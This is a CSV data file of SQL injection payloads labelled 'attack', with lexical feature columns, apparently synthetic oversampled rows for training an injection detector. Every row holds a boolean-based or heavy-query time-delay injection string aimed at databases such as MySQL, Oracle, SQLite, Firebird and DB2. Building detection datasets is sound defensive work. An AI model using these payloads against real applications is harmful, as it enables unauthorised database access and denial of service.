id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_001030,attack,boolean,"1'  )   as juxt where 5956  =  5956 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000144,1.2777447343838435,140.0416975571473,38.81667902285892,4.002786674292511,44.22501853428839,23.0,53.59166048857054,19.225018534288385,0.3157119470342791,0.1642870657842106,0.38286193773876454,0.1371390494427458,3.816679022858924,0.0,2.0,1.0,0.0,2.0,0.0,9.0,0.0,0.0,1.0,5.408339511429462,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.40833951142946195,0.0,1.0,0.0,0.5916604885705381,0.4083395114294619,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.4083395114294617
SMOTE_001031,attack,boolean,"1""  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  ""kxws"" like ""kxws",nearest_attack_euclidean,R000129,0.5720318646380816,129.49918595290322,27.195475207152874,3.4730284821295334,45.0436198342777,13.0,57.260090911472645,14.195475207152874,0.3505840632881768,0.1009167534898101,0.4394499453298025,0.10904923789221059,0.0,3.9999999999999996,0.0,0.0,0.0,1.2390950414305748,0.0,8.9563801657223,0.0,0.0,0.0,1.2390950414305744,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,-2.7755575615628914e-17,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.0
SMOTE_001032,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   ""%""  =  """,nearest_attack_euclidean,R000030,0.3176185517661622,130.3189796278772,30.1932483023231,4.124426998890823,73.5459864185848,4.000000000000002,35.77299320929241,17.0,0.564225431270742,0.030732370618777413,0.27442962298067664,0.13061257512980398,0.0,3.0,0.0,0.0,1.0,1.0,0.0,4.1932483023231,0.8067516976768996,0.0,3.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001033,attack,boolean,"-8429'   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  'bwih' like 'bwih",nearest_attack_euclidean,R000031,0.11853757440205949,102.76849184133945,30.926810300824815,3.5790109806097905,24.622112442989078,15.926810300824815,46.109784548762775,16.10978454876278,0.2388818479987836,0.1552876439680137,0.44905526855349825,0.15677523947970445,3.9634051504124073,0.0,0.9634051504124072,0.0,0.0,1.0,0.0,8.073189699175186,0.03659484958759285,1.0,1.0731896991751857,1.9634051504124073,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,1.0,0.9634051504124072,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.03659484958759296,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001034,attack,boolean,"1 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  -- pvdw",nearest_attack_euclidean,R000042,1.510349975705744,156.6605400107779,31.722502247796513,3.807740087760534,47.92351033986395,21.512007192948836,61.1245184319314,26.10050404603372,0.30904173873723667,0.13451252366700284,0.38551657223760777,0.1709291653581527,0.0,0.0,2.0,0.0,0.0,1.3445004495593025,0.0,12.756003596474418,0.0,1.6554995504406975,1.6890008991186047,9.344500449559302,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.34450044955930237,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.722502247796512,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0670026973558144
SMOTE_001035,attack,boolean,"1 and elt  (  4249  =  4249,7259  )  -- meef",nearest_attack_euclidean,R000110,0.10746948941701825,44.32207804836547,20.05855964515736,3.5803092146983864,10.117119290314719,13.117119290314715,15.087839467736039,6.000000000000002,0.2280712678885094,0.2958538157624365,0.34050982060119983,0.1355650957478542,0.0,0.029279822578678782,2.0,0.0,0.0,1.0292798225786788,0.0,1.970720177421322,0.0,0.0,0.9707201774213212,3.029279822578679,0.0,0.029279822578678782,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.029279822578678782,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0292798225786788
SMOTE_001036,attack,boolean,"1'+  (  select 'tzyz' where 4912  =  4912 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000146,0.28217939260452973,142.51666365703957,40.0,4.052904108066089,46.0,23.0,53.0,20.516663657039558,0.3227810083705887,0.16139050418529435,0.3718998574704609,0.14392862997365602,4.516663657039559,0.0,2.0,1.0,0.0,2.0,0.0,9.0,0.0,0.0,1.0,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001037,attack,boolean,"-6496""   )    )     )   or 1471  =  5278 and    (    (     (  ""zkoj""  =  ""zkoj",nearest_attack_euclidean,R000070,0.6851101199315857,81.11035502027995,23.77734572587426,3.2157891849350957,15.443850373077112,12.888672862937131,39.555663568531436,13.222168215734282,0.18759555655467877,0.15830437891105584,0.490653227081139,0.16344683745312633,0.0,3.9999999999999996,1.0,0.0,0.0,1.7778317842657176,0.0,6.0,0.0,0.22216821573428247,0.22216821573428236,2.7778317842657176,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001038,attack,boolean,"-9133""   )    )    or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""crfy""  =  ""crfy",nearest_attack_euclidean,R000156,0.3158023341414389,383.37530907150324,36.70071482896113,3.559927438917888,100.10214448688339,48.085510048868244,169.74346985339523,65.44418468235638,0.26097847532638396,0.12550549446747347,0.4428865852120335,0.17062944499410898,0.0,3.9999999999999996,1.0,0.0,0.0,2.9572449755658754,0.0,34.0,0.08551004886824895,2.871734926697626,0.0,23.529694731224627,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.9572449755658754,1.0,0.0,0.0,0.9572449755658754,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5130602932094928,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.47030526877537
SMOTE_001039,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""eevk""  =  ""eevk",nearest_attack_euclidean,R000016,0.506784386016502,123.62395366016507,30.0,3.7624886475700476,44.80523267116123,14.335581386307101,47.15430237531094,17.328837227385797,0.3574503777510762,0.11880353085097092,0.3829837441005296,0.1407623472974233,0.0,3.1677906931535507,0.16779069315355077,0.0,0.0,1.0,0.0,9.328837227385797,0.0,1.0,2.6644186136928982,1.1677906931535507,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,1.0,0.16779069315355088,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8322093068464491,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001040,attack,boolean,"1%'  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  '%'  =  '",nearest_attack_euclidean,R000150,1.527412878917687,147.77937796586465,31.16906694879697,4.091147889017388,78.6762677951879,8.389688982932325,41.88248813654141,18.830933051203026,0.5321525542810864,0.056752465724518766,0.28359830834167365,0.1274966716527212,4.0,0.0,0.0,0.0,1.0,1.610311017067676,0.0,5.220622034135352,1.2206220341353518,0.0,2.389688982932324,2.6103110170676755,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001041,attack,boolean,-9148  )   where 2027  =  2027 or 8571  =  8571--,nearest_attack_euclidean,R000047,1.3293155168604727,43.656654984926234,15.886803121859634,3.450394509809691,5.886803121859636,18.218884994975415,13.773606243719271,5.777360624371926,0.12886266781766398,0.42415695106552687,0.30726549076197895,0.13971489035483017,0.22263937562807334,0.0,3.0,0.0,0.0,1.7773606243719269,0.0,0.7773606243719282,0.0,0.0,0.0,4.777360624371926,0.22263937562807318,0.0,1.0,0.0,0.0,1.0,0.7773606243719268,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.7773606243719268,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.7773606243719264
SMOTE_001042,attack,boolean,"-7731""   )    )    or make_set  (  2551  =  4389,4389  )   and    (    (   ""unly"" like ""unly",nearest_attack_euclidean,R000050,3.523006326640198,97.16573213808958,27.750060947515898,3.7941739393996055,33.16621971821675,14.750060947515898,36.83280512152889,12.416646350828035,0.3340557864667863,0.16334295282225048,0.36917387964112125,0.133427381069842,0.0,3.9999999999999996,0.5833536491719657,0.0,0.0,1.0,0.0,5.666585403312137,0.0,0.5833536491719657,0.5833536491719657,1.5833536491719657,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.4166463508280342,-2.7755575615628914e-17,0.41664635082803425,0.0,0.0,0.0,1.0,0.5833536491719657,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.41664635082803425,0.41664635082803425,2.8332927016560685
SMOTE_001043,attack,boolean,1' and 7533  =  7533 and 'frvk'  =  'frvk,nearest_attack_euclidean,R000039,1.712094539030154,40.364460166854684,14.31776991657266,3.396201921428342,12.093380500564045,11.542159332581274,12.0,4.728920333709365,0.29814018648352736,0.2882729150307318,0.2974524565339236,0.11613444195181724,2.7289203337093624,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,2.0,0.6822300834273405,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.3177699165726594,0.0,1.6822300834273407,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001044,attack,boolean,or 1  =  1 or ''  =  ',nearest_attack_euclidean,R000001,2.953146264744632,30.386603454389032,10.659224141327236,2.4957295632905394,3.0681551717345528,6.65922414132724,15.193301727194516,5.465922414132725,0.12040113631886823,0.18832923204593316,0.5,0.1912696316351986,2.0681551717345523,0.0,0.46592241413272384,0.0,0.0,1.5340775858672762,0.0,1.3977672423981726,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,0.4659224141327239,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,1.5340775858672762,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.5340775858672764
SMOTE_001045,attack,boolean,"1%""   )    )     )   and 3116  =  9088#",nearest_attack_euclidean,R000041,0.3089436988126606,38.949235831309764,14.898471662619539,2.764968671454638,3.0,9.0,20.0,6.949235831309769,0.07702583839815835,0.23107751519447509,0.5135055893210557,0.1783910570863108,0.05076416869023048,0.9492358313097696,0.0,0.0,0.0,1.0,0.0,3.0,0.9999999999999998,0.0,0.0,1.0,0.05076416869023037,0.9492358313097697,0.0,0.9492358313097696,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_001046,attack,boolean,-7770' where 6503  =  6503 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,nearest_attack_euclidean,R000069,2.245603566740409,353.0883921632749,30.607738557816766,3.306598229678011,84.73482351017545,54.65743793200779,164.30386927890837,49.39226144218324,0.2400315431713552,0.15474436462778515,0.4653457708400252,0.13987832136083445,1.0,0.0,2.088392163274852,0.0,0.0,1.6961307210916174,0.0,34.30386927890838,0.0,0.0,0.0,13.78452288436647,1.0,0.0,0.6961307210916174,0.30386927890838256,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.6961307210916174,0.0,0.3038692789083825,0.6961307210916174,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,16.69613072109162
SMOTE_001047,attack,boolean,"1   )    )    as prnp where 4932  =  4932 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000068,0.800537790102046,231.59166536450496,35.82958326822525,3.7805430628023022,68.39229124346411,34.07395817056312,92.9774996093515,36.14791634112623,0.2951038340060369,0.14728623283186343,0.40219053103391034,0.1554194021281894,0.0,0.0,2.0,0.0,0.0,2.0,0.0,19.659166536450495,0.0,1.4147916341126239,3.414791634112624,11.659166536450495,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.829583268225248,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.829583268225248
SMOTE_001048,attack,boolean,"1 and elt  (  4249  =  4249,7259  )  -- meef",nearest_attack_euclidean,R000110,0.5847007040063009,42.444423901887106,19.401701500725807,3.5557941496687393,9.042722401161292,12.88034030014516,14.401701500725807,6.119659699854839,0.2077973215778781,0.306420427039483,0.3387159145921034,0.14706633679053543,0.0,0.11965969985483893,2.119659699854839,0.0,0.0,1.0,0.0,1.8803403001451615,0.11965969985483893,0.0,0.8803403001451613,3.119659699854839,0.0,0.11965969985483874,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.8803403001451611,0.11965969985483887,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_001049,attack,boolean,"1 where 5485  =  5485 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000040,1.303488687747892,233.0337903393882,35.70787001996401,3.7898034952213346,67.81651012643873,36.13858001330934,91.3858001330934,37.6929000665467,0.2900161863984693,0.15649918609835678,0.39215686274509803,0.16132776475807584,0.0,0.43070999334533006,2.0,0.0,0.0,2.0,0.0,19.84645003327335,0.0,1.5692900066546698,3.5692900066546698,12.27716002661868,0.0,0.43070999334532994,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.13858001330934,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.13858001330934
SMOTE_001050,attack,boolean,-1760   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  1541  =  1541,nearest_attack_euclidean,R000061,0.7137102714881627,89.16148035298116,19.0,2.8069783879578925,6.453323176830374,22.223716117207324,48.0,12.484441058943457,0.07222701135742787,0.24944259749811537,0.5383581701694014,0.1399722209750554,0.6459214119246091,0.0,0.8385196470188477,0.0,1.0,2.0,0.0,8.0,0.0,0.0,0.0,3.8385196470188476,0.16148035298115226,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,1.1614803529811522,0.8385196470188477,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001051,attack,boolean,"1""  )   as upjw where 3880  =  3880 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000072,0.5727444465065391,154.9117797621389,34.303926587379635,4.177898187085926,74.60785317475927,18.0,41.84803670631018,20.45588988106945,0.4815802632514062,0.11621704400493099,0.27022333209261096,0.13197936065105184,0.45588988106945116,0.848036706310183,2.0,0.0,1.0,2.0,0.0,5.0,0.0,5.0,4.0,5.151963293689817,0.15196329368981687,0.8480367063101832,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.1519632936898172,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.151963293689817
SMOTE_001052,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  '%'  =  '",nearest_attack_euclidean,R000140,2.9806057858641215,131.80480818348184,31.026257459420748,3.837759727121377,49.915532821451286,12.378994032463403,48.673520886378085,20.836760443189046,0.3749279572728362,0.09792524989972243,0.36949508737097553,0.15765170545646587,3.0,0.0,0.0,0.0,0.0,0.5947485081158506,0.0,10.215754475652448,0.5947485081158506,1.4052514918841492,2.1894970162317016,3.026257459420746,1.0,0.0,0.0,0.0,0.0,0.5947485081158507,1.0,0.0,0.0,3.469446951953614e-18,0.40525149188414944,0.4052514918841494,0.0,0.0,0.4052514918841493,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5947485081158508,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.4052514918841497
SMOTE_001053,attack,boolean,-2174'   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'dyyg'  =  'dyyg,nearest_attack_euclidean,R000109,0.40466830864086845,164.1676117430219,37.91619412848906,4.08274794586402,62.497164770934354,18.251417614532823,59.16761174302188,24.251417614532823,0.3807700160649991,0.11114312853545982,0.3603948618255407,0.14769199357400034,7.832388256978118,0.0,0.9580970642445296,0.0,0.0,2.0,0.0,8.167611743021881,0.0,0.08380587151094088,0.04190293575547055,7.125708807266411,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.041902935755470494,0.9580970642445295,0.9580970642445296,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9580970642445296,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9580970642445296,0.9580970642445296,6.832388256978119
SMOTE_001054,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ugum' like 'ugum",nearest_attack_euclidean,R000104,1.7376135768031902,142.24224483185986,31.648448966371973,4.282816701825548,85.45937958654879,7.378138759646367,33.75627751929273,15.648448966371971,0.6042766022329413,0.05061498547848936,0.23569616213443398,0.10941225015413542,3.729689793274394,0.0,0.0,0.0,1.0,0.7296897932743943,0.0,3.729689793274395,0.0,0.0,2.729689793274394,1.7296897932743938,1.0,0.0,0.0,0.0,0.0,0.7296897932743942,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.7296897932743942,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.729689793274394
SMOTE_001055,attack,boolean,"1 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000114,1.2873508993433478,241.235596499444,36.34455221425924,3.775540032277388,73.37820885703695,30.445522142592388,96.06731328555543,41.34455221425924,0.3043663134671808,0.1256224413588341,0.3984180532574532,0.17159319191653188,0.0,0.0,2.0,0.0,0.0,1.344552214259239,0.0,22.0,0.0,2.0,4.0,13.344552214259238,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.3445522142592389,0.0,0.6554477857407611,0.3445522142592389,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.344552214259238
SMOTE_001056,attack,boolean,1   )    )     )   and 9575  =  1640--,nearest_attack_euclidean,R000078,1.4152528886688662,40.35279207618116,16.35279207618117,3.0375801408857694,5.7449240888780295,10.568528050787448,18.039339936515688,6.000000000000002,0.13711048992154404,0.25982591940448113,0.45361188759806986,0.14945170307590488,0.0,0.0,2.0,0.0,0.0,1.0,0.0,2.6078679873031385,0.0,0.0,0.3921320126968617,3.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
